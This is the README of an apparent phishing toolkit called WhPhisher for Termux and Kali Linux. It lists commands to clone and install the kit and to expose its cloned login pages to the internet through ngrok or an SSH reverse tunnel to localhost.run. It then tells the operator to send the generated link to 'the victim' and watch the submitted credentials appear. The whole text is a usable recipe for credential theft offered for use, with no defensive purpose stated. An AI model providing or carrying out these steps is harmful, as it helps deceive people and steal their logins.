# WhPhisher

The best tool for phishing with the most famous pages updated.


# Tested on:

Termux, Kali Linux and debian


# Steps

To make this tool less likely to fail, it is advised to install the latest version of Termux, and the Termux API.


# -- How to install --

`pkg install bash`

`pkg install git`

`git clone https://github.com/SilentHexor/WhPhisher.git`

`cd WhPhisher`

`chmod +x *`

`bash requisitoswh.sh`

Wait for them to be installed and automatically start WhPhisher :D

Choose the page and wait for the tunneling to start.


# Solution if the link is not generated or does not work (2 solutions)

# - - - Solution 1 - - -


`Open new session`

`cd NgrokWh`

`chmod +x ngrokwh.sh`

`./ngrokwh.sh`

`and`

`ngrok http 8080`

Share the link that generated the victim :D

Now we return to the main session, and if someone put their data, they will appear there :D

# - - - Solution 2 - - -

Steps:

`We open a new session`

`cd`

`pkg install openssh -y`

`ssh -R 80:localhost:8080 nokey@localhost.run`

Share the link that was generated :D

# how it should look
- The green covers personal information
- The yellow arrow points to the link to be shared
